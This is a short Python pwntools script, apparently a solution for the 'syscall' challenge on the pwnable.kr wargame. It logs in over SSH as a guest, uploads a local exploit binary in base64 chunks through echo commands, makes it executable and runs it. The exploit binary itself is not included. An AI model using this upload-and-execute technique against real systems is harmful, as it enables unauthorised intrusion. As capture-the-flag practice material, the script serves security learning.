import base64
from pwn import *

EXPLOIT_PATH = '/tmp/exploit'

SHELL_PROMPT = '/ $'


def get_splitted_encoded_exploit():
    split_every = 256
    with open('exploit', 'rb') as exploit_file:
        exploit = base64.b64encode(exploit_file.read())
    return [exploit[i:i+split_every] for i in range(0, len(exploit), split_every)]


def upload_exploit(sh):
    chunks_sent = 0
    splitted_exploit = get_splitted_encoded_exploit()
    for exploit_chunk in splitted_exploit:
        print(f'[*] Sending a chunk ({chunks_sent}/{len(splitted_exploit)})')
        sh.sendlineafter(
            SHELL_PROMPT, f'echo {exploit_chunk.decode()} | base64 -d >> {EXPLOIT_PATH}')
        chunks_sent += 1


def run_exploit(sh):
    print('[*] Making the exploit executable.')
    sh.sendline(f'chmod +x {EXPLOIT_PATH}')
    print('[*] Running the exploit.')
    sh.sendline(EXPLOIT_PATH)


def main():
    s = ssh('syscall', 'pwnable.kr', 2222, 'guest')
    sh = s.run('/bin/sh')
    upload_exploit(sh)
    run_exploit(sh)
